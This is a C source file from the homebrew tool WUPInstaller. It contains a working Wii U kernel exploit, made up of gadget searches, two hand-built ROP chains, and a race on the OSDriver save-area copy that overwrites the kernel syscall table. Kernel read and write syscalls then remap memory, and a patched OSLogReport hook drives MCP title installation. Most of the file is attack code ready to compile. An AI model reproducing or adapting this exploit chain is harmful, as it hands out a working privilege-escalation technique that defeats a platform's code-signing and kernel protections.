/*
	WUPInstaller - Install Wii U NUS content - [https://github.com/crediar/wupinstaller]

	Copyright (c) 2015 crediar

	WUPInstaller is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
#include "loader.h"

#define MAPOff   0
#define ADR(x)  (0xA0000000|(x-MAPOff))

typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;
typedef unsigned long long u64;

typedef unsigned int sec_t;

typedef signed char s8;
typedef signed short s16;
typedef signed int s32;
typedef signed long long s64;

typedef volatile unsigned char vu8;
typedef volatile unsigned short vu16;
typedef volatile unsigned int vu32;
typedef volatile unsigned long long vu64;

typedef volatile signed char vs8;
typedef volatile signed short vs16;
typedef volatile signed int vs32;
typedef volatile signed long long vs64;

typedef unsigned long ULONG;
typedef ULONG *PULONG;
typedef unsigned short USHORT;
typedef USHORT *PUSHORT;
typedef unsigned char UCHAR;
typedef UCHAR *PUCHAR;

typedef char	CHAR;
typedef short SHORT;
typedef long	LONG;
typedef s32		NFCError;
#define far
#define FAR                 far

u32 PatchB( u32 dst, u32 src );
u32 PatchBL( u32 dst, u32 src );
void printChar(char *buf);
void _start()
{
	// Notify the user if the kernel version is not implemented
	if(KERN_SYSCALL_TBL == 0)
	{
		OSFatal("Exploit not compatible with your System\n");
	}

	//Load a good stack
	asm(
#if VER == 532
  "lis %r1, 0x124b;"
  "ori %r1, %r1, 0x6368;"
#else
  "lis %r1, 0x1ab5 ;"
  "ori %r1, %r1, 0xd138 ;"
#endif
	);

	unsigned int coreinit_handle;
	OSDynLoad_Acquire("coreinit.rpl", &coreinit_handle );
    	
	//OSScreen functions
	void(*OSScreenInit)();
	unsigned int(*OSScreenGetBufferSizeEx)(unsigned int bufferNum);
	unsigned int(*OSScreenSetBufferEx)(unsigned int bufferNum, void * addr);
    	
	//OS Memory functions
	void*(*memset)(void *dest, uint32_t value, uint32_t bytes);
	void*(*memcpy)(void *dest, void *src, uint32_t length);
	void*(*OSAllocFromSystem)(uint32_t size, int align);
	void (*OSFreeToSystem)(void *ptr);
	void (*DCFlushRange)(void *buffer, uint32_t length);
	void (*DCInvalidateRange)(void *buffer, uint32_t length);
	void (*ICInvalidateRange)(void *buffer, uint32_t length);
	uint32_t (*OSEffectiveToPhysical)(void *vaddr);

	/* OS thread functions */
	bool (*OSCreateThread)(void *thread, void *entry, int argc, void *args, uint32_t stack, uint32_t stack_size, int32_t priority, uint16_t attr);
	int32_t (*OSResumeThread)(void *thread);
	void (*OSYieldThread)();

	//IM functions
	int(*IM_SetDeviceState)(int fd, void *mem, int state, int a, int b);
	int(*IM_Close)(int fd);
	int(*IM_Open)();

	/* Exit functions */
	void (*__PPCExit)();
	void (*_Exit)();

	OSDynLoad_FindExport(coreinit_handle, 0, "OSScreenInit", &OSScreenInit);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSScreenGetBufferSizeEx", &OSScreenGetBufferSizeEx);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSScreenSetBufferEx", &OSScreenSetBufferEx);
  
	OSDynLoad_FindExport(coreinit_handle, 0, "memset", &memset);
	OSDynLoad_FindExport(coreinit_handle, 0, "memcpy", &memcpy);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSAllocFromSystem", &OSAllocFromSystem);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSFreeToSystem", &OSFreeToSystem);
	OSDynLoad_FindExport(coreinit_handle, 0, "DCFlushRange", &DCFlushRange);
	OSDynLoad_FindExport(coreinit_handle, 0, "DCInvalidateRange", &DCInvalidateRange);
	OSDynLoad_FindExport(coreinit_handle, 0, "ICInvalidateRange", &ICInvalidateRange);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSEffectiveToPhysical", &OSEffectiveToPhysical);
	
	OSDynLoad_FindExport(coreinit_handle, 0, "OSCreateThread", &OSCreateThread);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSResumeThread", &OSResumeThread);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSYieldThread", &OSYieldThread);
	
	OSDynLoad_FindExport(coreinit_handle, 0, "IM_SetDeviceState", &IM_SetDeviceState);
	OSDynLoad_FindExport(coreinit_handle, 0, "IM_Close", &IM_Close);
	OSDynLoad_FindExport(coreinit_handle, 0, "IM_Open", &IM_Open);   
	
	OSDynLoad_FindExport(coreinit_handle, 0, "__PPCExit", &__PPCExit);
	OSDynLoad_FindExport(coreinit_handle, 0, "_Exit", &_Exit);

	//Restart system to get lib access
	int fd = IM_Open();
	void *mem = OSAllocFromSystem(0x100, 64);
	memset(mem, 0, 0x100);
	//set restart flag to force quit browser
	IM_SetDeviceState(fd, mem, 3, 0, 0); 
	IM_Close(fd);
	OSFreeToSystem(mem);
	//wait a bit for browser end
	unsigned int t1 = 0x1FFFFFFF;
	while(t1--);

  /* 0xA0000000 maps the kernel */
  if( OSEffectiveToPhysical((void*)0xA0000000) != 0 )
  {  
    goto after_exploit;
  }

	/* Allocate a stack for the threads */
	uint32_t stack0 = (uint32_t) OSAllocFromSystem(0x300, 0x20);
	uint32_t stack2 = (uint32_t) OSAllocFromSystem(0x300, 0x20);

	/* Create the threads */
	void *thread0 = OSAllocFromSystem(OSTHREAD_SIZE, 8);
	bool ret0 = OSCreateThread(thread0, _Exit, 0, NULL, stack0 + 0x300, 0x300, 0, 1);
	void *thread2 = OSAllocFromSystem(OSTHREAD_SIZE, 8);
	bool ret2 = OSCreateThread(thread2, _Exit, 0, NULL, stack2 + 0x300, 0x300, 0, 4);
	if (ret0 == false || ret2 == false)
	{
		OSFatal("Exploit failed, please try again.\n");
	}

	/* Find a bunch of gadgets */
	uint32_t sleep_addr;
	OSDynLoad_FindExport(coreinit_handle, 0, "OSSleepTicks", &sleep_addr);
	sleep_addr += 0x44;
	uint32_t sigwait[] = {0x801F0000, 0x7C0903A6, 0x4E800421, 0x83FF0004, 0x2C1F0000, 0x4082FFEC, 0x80010014, 0x83E1000C, 0x7C0803A6, 0x38210010, 0x4E800020};
	uint32_t sigwait_addr = (uint32_t) find_gadget(sigwait, 0x2c, (uint32_t) __PPCExit);
	uint32_t r3r4load[] = {0x80610008, 0x8081000C, 0x80010014, 0x7C0803A6, 0x38210010, 0x4E800020};
	uint32_t r3r4load_addr = (uint32_t) find_gadget(r3r4load, 0x18, (uint32_t) __PPCExit);
	uint32_t r5load[] = {0x80A10008, 0x38210010, 0x7CA32B78, 0x80810004, 0x7C8803A6, 0x4E800020};
	uint32_t r5load_addr = (uint32_t) find_gadget(r5load, 0x18, (uint32_t) __PPCExit);
	uint32_t r6load[] = {0x80C10014, 0x90610010, 0x80010010, 0x915E002C, 0x81210008, 0x901E0030, 0x913E0028, 0x90DE0034, 0x80010034, 0x83E1002C, 0x7C0803A6, 0x83C10028, 0x38210030, 0x4E800020};
	uint32_t r6load_addr = (uint32_t) find_gadget(r6load, 0x38, (uint32_t) __PPCExit);
	uint32_t r30r31load[] = {0x80010034, 0x83E1002C, 0x7C0803A6, 0x83C10028, 0x38210030, 0x4E800020};
	uint32_t r30r31load_addr = (uint32_t) find_gadget(r30r31load, 0x18, (uint32_t) __PPCExit);

	/* Find the OSDriver functions */
	uint32_t reg[] = {0x38003200, 0x44000002, 0x4E800020};
	uint32_t (*Register)(char *driver_name, uint32_t name_length, void *buf1, void *buf2) = find_gadget(reg, 0xc, (uint32_t) __PPCExit);
	uint32_t dereg[] = {0x38003300, 0x44000002, 0x4E800020};
	uint32_t (*Deregister)(char *driver_name, uint32_t name_length) = find_gadget(dereg, 0xc, (uint32_t) __PPCExit);
	uint32_t copyfrom[] = {0x38004700, 0x44000002, 0x4E800020};
	uint32_t (*CopyFromSaveArea)(char *driver_name, uint32_t name_length, void *buffer, uint32_t length) = find_gadget(copyfrom, 0xc, (uint32_t) __PPCExit);
	uint32_t copyto[] = {0x38004800, 0x44000002, 0x4E800020};
	uint32_t (*CopyToSaveArea)(char *driver_name, uint32_t name_length, void *buffer, uint32_t length) = find_gadget(copyto, 0xc, (uint32_t) __PPCExit);

	/* Set up the ROP chain for CPU0 */
	OSContext *ctx0 = (OSContext*) thread0;
	uint32_t *rop0 = (uint32_t*) stack0;
	ctx0->gpr[1] = stack0 + 0x80;
	ctx0->gpr[28] = 0;
	ctx0->gpr[29] = CPU0_WAIT_TIME;
	ctx0->gpr[31] = stack0 + 0x1f8;
	ctx0->srr0 = sigwait_addr + 0xc;
	rop0[0x94/4] = sleep_addr;
	rop0[0x114/4] = r3r4load_addr;
	rop0[0x118/4] = stack0 + 0x208;
	rop0[0x11c/4] = 4;
	rop0[0x124/4] = r30r31load_addr;
	rop0[0x14c/4] = stack0 + 0x220;
	rop0[0x154/4] = sigwait_addr;
	rop0[0x164/4] = r5load_addr;
	rop0[0x168/4] = stack0 + 0x218;
	rop0[0x174/4] = r3r4load_addr;
	rop0[0x178/4] = stack0 + 0x210;
	rop0[0x17c/4] = 4;
	rop0[0x184/4] = r30r31load_addr;
	rop0[0x1a8/4] = stack0 + 0x230;
	rop0[0x1b4/4] = r6load_addr;
	rop0[0x1c4/4] = stack0 + 0x21c;
	rop0[0x1dc/4] = stack0 + 0x228;
	rop0[0x1e4/4] = sigwait_addr;
	rop0[0x1f4/4] = sigwait_addr + 0x28;
	rop0[0x1f8/4] = sigwait_addr + 0xc;
	rop0[0x1fc/4] = stack0 + 0x1f8;
	rop0[0x200/4] = 0;
	rop0[0x204/4] = 0;
	rop0[0x208/4] = 0x44525642;
	rop0[0x20c/4] = 0;
	rop0[0x210/4] = 0x44525643;
	rop0[0x214/4] = 0;
	rop0[0x218/4] = 0;
	rop0[0x21c/4] = 0;
	rop0[0x220/4] = (uint32_t)Deregister;
	rop0[0x224/4] = 0;
	rop0[0x228/4] = (uint32_t)Register;
	rop0[0x22c/4] = 0;
	
	/* Set up the ROP chain for CPU2 */
	OSContext *ctx2 = (OSContext*) thread2;
	uint32_t *rop2 = (uint32_t*) stack2;
	ctx2->gpr[1] = stack2 + 0x80;
	ctx2->gpr[28] = 0;
	ctx2->gpr[29] = CPU2_WAIT_TIME;
	ctx2->gpr[31] = stack2 + 0x1a8;
	ctx2->srr0 = sigwait_addr + 0xc;
	rop2[0x94/4] = sleep_addr;
	rop2[0x114/4] = r5load_addr;
	rop2[0x118/4] = stack2 + 0x204;
	rop2[0x124/4] = r3r4load_addr;
	rop2[0x128/4] = stack2 + 0x1b8;
	rop2[0x12c/4] = 4;
	rop2[0x134/4] = r30r31load_addr;
	rop2[0x158/4] = stack2 + 0x1c8;
	rop2[0x164/4] = r6load_addr;
	rop2[0x174/4] = 4;
	rop2[0x18c/4] = stack2 + 0x1c0;
	rop2[0x194/4] = sigwait_addr;
	rop2[0x1a4/4] = sigwait_addr + 0x28;
	rop2[0x1a8/4] = sigwait_addr + 0xc;
	rop2[0x1ac/4] = stack2 + 0x1a8;
	rop2[0x1b0/4] = 0;
	rop2[0x1b4/4] = 0;
	rop2[0x1b8/4] = 0x44525641;
	rop2[0x1bc/4] = 0;
	rop2[0x1c0/4] = (uint32_t)CopyToSaveArea;
	rop2[0x1c4/4] = 0;
	rop2[0x204/4] = 0xDEADC0DE;

	/* Register driver A and driver B */
	char *drva_name = OSAllocFromSystem(8, 4);
	memcpy(drva_name, "DRVA", 5);
	char *drvb_name = OSAllocFromSystem(8, 4);
	memcpy(drvb_name, "DRVB", 5);
	uint32_t status = Register(drva_name, 4, NULL, NULL) | Register(drvb_name, 4, NULL, NULL);
	if (status != 0)
	{
		OSFatal("Exploit failed, please try again.\n");
	}

	/* Generate the copy payload, which writes to syscall_table[0x34] */
	uint32_t testval = 0xDEADBEEF;
	uint32_t *copy_payload = OSAllocFromSystem(0x1000, 0x20);
	if (!copy_payload)
	{
		OSFatal("Exploit failed, please try again.\n");
	}
	copy_payload[0] = 0x01234567;
	copy_payload[0xfb4/4] = 0x44525648;
	copy_payload[0xfb8/4] = 0x41580000;
	copy_payload[0xff4/4] = PFID_BROWSER;
	copy_payload[0xff8/4] = /*&testval*/KERN_SYSCALL_TBL + (0x34 * 4);
	DCFlushRange(copy_payload, 0x1000);
	DCInvalidateRange(copy_payload, 0x1000);

	/* Schedule both threads for execution */
	OSResumeThread(thread0);
	OSResumeThread(thread2);

	/* Do a dummy copy to put CopyToSaveArea() in our cache */
	CopyToSaveArea(drvb_name, 4, (void*)0xC0000004, 4);

	/* Signal the CPU0 and CPU2 threads to begin */
	rop2[0x1ac/4] = 0;
	rop0[0x1fc/4] = 0;

	/* Start copying the payload into driver B's save area */
	CopyToSaveArea(drvb_name, 4, copy_payload, 0x1000);

	/* Wait for a while, which somehow helps things */
	int i = 0, ctr = 0;
	for (i = 0; i < 300000000; i++)
	{
		ctr++;
	}

	/* Use DRVHAX to install the read and write syscalls */
	char *drvhax_name = OSAllocFromSystem(8, 4);
	memcpy(drvhax_name, "DRVHAX", 7);
	uint32_t *syscalls = OSAllocFromSystem(8, 4);
	syscalls[0] = KERN_CODE_READ;
	syscalls[1] = KERN_CODE_WRITE;
	status = CopyToSaveArea(drvhax_name, 6, syscalls, 8);

	/* Verify that the syscalls were installed */
	uint32_t result = 42;
	status = CopyFromSaveArea(drvhax_name, 6, &result, 4);
	if (result != KERN_CODE_READ)
	{
		//Call the Screen initilzation function.
		OSScreenInit();
		//Grab the buffer size for each screen (TV and gamepad)
		int buf0_size = OSScreenGetBufferSizeEx(0);
		int buf1_size = OSScreenGetBufferSizeEx(1);
		//Set the buffer area.
		OSScreenSetBufferEx(0, (void *)0xF4000000);
		OSScreenSetBufferEx(1, (void *)(0xF4000000 + buf0_size));
		//Clear both framebuffers.
		int ii;
		for (ii = 0; ii < 2; ii++)
		{
			fillScreen(0,0,0,0);
			flipBuffers();
		}
		printChar("Race attack failed! Please enter the system settings and exit\nthem before retrying.");
		t1 = 0x3FFFFFFF;
		while(t1--) ;
		for(ii = 0; ii < 2; ii++)
		{
			fillScreen(0,0,0,0);
			flipBuffers();
		}
		_Exit();
	}

	/* Search the kernel heap for DRVA and DRVHAX */
	uint32_t drva_addr = 0, drvhax_addr = 0;
	uint32_t metadata_addr = KERN_HEAP + 0x14 + (kern_read((void*)(KERN_HEAP + 0x0c)) * 0x10);
	while (metadata_addr >= KERN_HEAP + 0x14)
	{
		/* Read the data address from the metadata, then read the data */
		uint32_t data_addr = kern_read((void*)metadata_addr);
		uint32_t data = kern_read((void*)data_addr);

		/* Check for DRVA or DRVHAX, and if both are found, break */
		if (data == 0x44525641) drva_addr = data_addr;
		else if (data == 0x44525648) drvhax_addr = data_addr;
		if (drva_addr && drvhax_addr) break;

		/* Go to the previous metadata entry */
		metadata_addr -= 0x10;
	}
	if (!(drva_addr && drvhax_addr))
    OSFatal("Exploit failed, please try again.\n");

	/* Make DRVHAX point to DRVA to ensure a clean exit */
	kern_write((void*)(drvhax_addr + 0x48), drva_addr);

	/* Map the loader and coreinit as RW before exiting */
#if (VER<410)
	kern_write((void*)(KERN_ADDRESS_TBL + (0x12 * 4)), 0x30000000);
#else
	kern_write((void*)(KERN_ADDRESS_TBL + (0x12 * 4)), 0x31000000);
#endif
	kern_write((void*)(KERN_ADDRESS_TBL + (0x13 * 4)), 0x28305800);
	_Exit();

after_exploit:;

#include "..\mcppatch.h"

  // This is the largest function that's probably no use (1084 bytes)
	uint32_t oslogreport;
	int err = OSDynLoad_FindExport( coreinit_handle, 0, "OSLogReport", (void**)&oslogreport );
	uint32_t hook;
	err += OSDynLoad_FindExport( coreinit_handle, 0, "OSRestoreInterrupts", (void**)&hook );
	uint32_t OSGetPFID;
	err += OSDynLoad_FindExport( coreinit_handle, 0, "OSGetPFID", (void**)&OSGetPFID );
	uint32_t iosopen;
	err += OSDynLoad_FindExport( coreinit_handle, 0, "IOS_Open", (void**)&iosopen );
	uint32_t mpinfo;
	err += OSDynLoad_FindExport( coreinit_handle, 0, "MCP_InstallGetInfo", (void**)&mpinfo );
	uint32_t mpinstall;
	err += OSDynLoad_FindExport( coreinit_handle, 0, "MCP_InstallTitleAsync", (void**)&mpinstall );
	uint32_t mpistatus;
	err += OSDynLoad_FindExport( coreinit_handle, 0, "MCP_InstallGetProgress", (void**)&mpistatus );
	uint32_t mperror;
	err += OSDynLoad_FindExport( coreinit_handle, 0, "MCP_GetLastRawError", (void**)&mperror );
	uint32_t alloc;
	err += OSDynLoad_FindExport( coreinit_handle, 0, "OSAllocFromSystem", (void**)&alloc );
	uint32_t spf;
	err += OSDynLoad_FindExport( coreinit_handle, 0, "__os_snprintf", (void**)&spf );
	uint32_t osfatal;
	err += OSDynLoad_FindExport( coreinit_handle, 0, "OSFatal", (void**)&osfatal );
  if(err)
  {
    OSFatal("Failed to find an export");
  }

  uint32_t base_addr = oslogreport;

  //Find BLR
  while(1)
  {
    if( *(vu32*)ADR(hook) == 0x4E800020 )
      break;
    hook = hook + 4;
  }
  //OSReport("BLR:%08X\n", hook );

  //Patch function to always return gracefully
  *(vu32*)(ADR(base_addr+0x2C)) = 0x4800002C;
  base_addr += 0x70;
    
  u32 dev_str = base_addr;
  u32 ins_str = base_addr+0x10;
  u32 suc_str = base_addr+0x30;
  u32 err_str = base_addr+0x40;

  u32 flag_adr = (u32)OSAllocFromSystem( 4, 32 );

  memcpy( (void*)ADR(dev_str), "/dev/mcp", 9 );
  memcpy( (void*)ADR(ins_str), "/vol/app_sd/install", 20 );
  memcpy( (void*)ADR(suc_str), "Install OK.", 12 );
  memcpy( (void*)ADR(err_str), "Error:0x%08X", 13 );

  *(vu32*)(flag_adr) = 3;

  base_addr += 0x50;
   
  //char error[256];
  //__os_snprintf( error, sizeof(error), "%08X,%08X,%08X,%08X,%08X,%08X,%08X\nBase:%08X\nflag:%08X\nfa:%08X\nfunc:%p",
  //                                      oslogreport,hook,OSGetPFID,iosopen,mpinstall,mpistatus,alloc,
  //                                      base_addr, flag_adr, ADR(flag_adr), (void*)asm_patch );
  //OSFatal(error);
   
  //Our code
  memcpy( (void*)ADR(base_addr), (void*)mcppatch, sizeof(mcppatch) );
    
  //Flag address
  *(vu32*)ADR(base_addr+0x28) =  0x3C600000 | ((flag_adr)>>16);
  *(vu32*)ADR(base_addr+0x2C) =  0x38630000 | ((flag_adr)&0xFFFF);

  //dev str address
  *(vu32*)ADR(base_addr+0x44) =  0x3C600000 | (dev_str>>16);
  *(vu32*)ADR(base_addr+0x48) =  0x38630000 | (dev_str&0xFFFF);

  //path str address
  *(vu32*)ADR(base_addr+0x70) =  0x3C800000 | (ins_str>>16);
  *(vu32*)ADR(base_addr+0x74) =  0x38840000 | (ins_str&0xFFFF);

  *(vu32*)ADR(base_addr+0xC4) =  0x3C800000 | (ins_str>>16);
  *(vu32*)ADR(base_addr+0xC8) =  0x38840000 | (ins_str&0xFFFF);

  //err str address, r5
  *(vu32*)ADR(base_addr+0x128) =  0x3CA00000 | (err_str>>16);
  *(vu32*)ADR(base_addr+0x12C) =  0x38A50000 | (err_str&0xFFFF);

  //suc str address, r3
  *(vu32*)ADR(base_addr+0x10C) =  0x3C600000 | (suc_str>>16);
  *(vu32*)ADR(base_addr+0x110) =  0x38630000 | (suc_str&0xFFFF);
      
  //functions
  *(vu32*)ADR(base_addr+0x1C) = PatchBL( OSGetPFID, base_addr+0x1C );
  *(vu32*)ADR(base_addr+0x50) = PatchBL( iosopen, base_addr+0x50 );
  *(vu32*)ADR(base_addr+0x60) = PatchBL( alloc, base_addr+0x60 );
  *(vu32*)ADR(base_addr+0x78) = PatchBL( mpinfo, base_addr+0x78 );
  *(vu32*)ADR(base_addr+0xCC) = PatchBL( mpinstall, base_addr+0xCC );
  *(vu32*)ADR(base_addr+0xE8) = PatchBL( mpistatus, base_addr+0xE8 );
  *(vu32*)ADR(base_addr+0x100)= PatchBL( mperror,  base_addr+0x100 );
  *(vu32*)ADR(base_addr+0x118)= PatchBL( mperror,  base_addr+0x118 );
  *(vu32*)ADR(base_addr+0x130)= PatchBL( spf,  base_addr+0x130 );
  *(vu32*)ADR(base_addr+0x138)= PatchBL( osfatal, base_addr+0x138 );

  DCFlushRange( (void*)ADR(oslogreport), 0x300 );
  ICInvalidateRange( (void*)ADR(oslogreport), 0x300 );

  //Install hook
  *(vu32*)ADR(hook) = PatchB( base_addr, hook );

  DCFlushRange( (void*)ADR(hook), 0x20 );
  ICInvalidateRange( (void*)ADR(hook), 0x20 );

  _Exit();
}
/* Simple memcmp() implementation */
int memcmp(void *ptr1, void *ptr2, uint32_t length)
{
	uint8_t *check1 = (uint8_t*) ptr1;
	uint8_t *check2 = (uint8_t*) ptr2;
	uint32_t i;
	for (i = 0; i < length; i++)
	{
		if (check1[i] != check2[i]) return 1;
	}

	return 0;
}

void* memcpy(void* dst, const void* src, uint32_t size)
{
	uint32_t i;
	for (i = 0; i < size; i++)
		((uint8_t*) dst)[i] = ((const uint8_t*) src)[i];
	return dst;
}

/* Find a gadget based on a sequence of words */
void *find_gadget(uint32_t code[], uint32_t length, uint32_t gadgets_start)
{
	uint32_t *ptr;

	/* Search code before JIT area first */
	for (ptr = (uint32_t*) gadgets_start; ptr != (uint32_t*) JIT_ADDRESS; ptr++)
	{
		if (!memcmp(ptr, &code[0], length)) return ptr;
	}

	/* Restart search after JIT */
	for (ptr = (uint32_t*) CODE_ADDRESS_START; ptr != (uint32_t*) CODE_ADDRESS_END; ptr++)
	{
		if (!memcmp(ptr, &code[0], length)) return ptr;
	}

	OSFatal("Gadget not found!");
	return (void*)0;
}
/* Read a 32-bit word with kernel permissions */
uint32_t kern_read(const void *addr)
{
	uint32_t result;
	asm(
		"li 3,1\n"
		"li 4,0\n"
		"li 5,0\n"
		"li 6,0\n"
		"li 7,0\n"
		"lis 8,1\n"
		"mr 9,%1\n"
		"li 0,0x3400\n"
		"mr %0,1\n"
		"sc\n"
		"nop\n"
		"mr 1,%0\n"
		"mr %0,3\n"
		:	"=r"(result)
		:	"b"(addr)
		:	"memory", "ctr", "lr", "0", "3", "4", "5", "6", "7", "8", "9", "10",
			"11", "12"
	);

	return result;
}
/* Write a 32-bit word with kernel permissions */
void kern_write(void *addr, uint32_t value)
{
	asm(
		"li 3,1\n"
		"li 4,0\n"
		"mr 5,%1\n"
		"li 6,0\n"
		"li 7,0\n"
		"lis 8,1\n"
		"mr 9,%0\n"
		"mr %1,1\n"
		"li 0,0x3500\n"
		"sc\n"
		"nop\n"
		"mr 1,%1\n"
		:
		:	"r"(addr), "r"(value)
		:	"memory", "ctr", "lr", "0", "3", "4", "5", "6", "7", "8", "9", "10",
			"11", "12"
		);
}
u32 PatchB( u32 dst, u32 src )
{
	u32 newval = (dst - src);
	newval&= 0x03FFFFFC;
	newval|= 0x48000000;
	return newval;
}
u32 PatchBL( u32 dst, u32 src )
{
	u32 newval = (dst - src);
	newval&= 0x03FFFFFC;
	newval|= 0x48000001;
	return newval;
}
void printChar(char *buf)
{
	int i;
	for(i=0;i<2;i++)
	{
		drawString(0,0,buf);
		flipBuffers();
	}
}
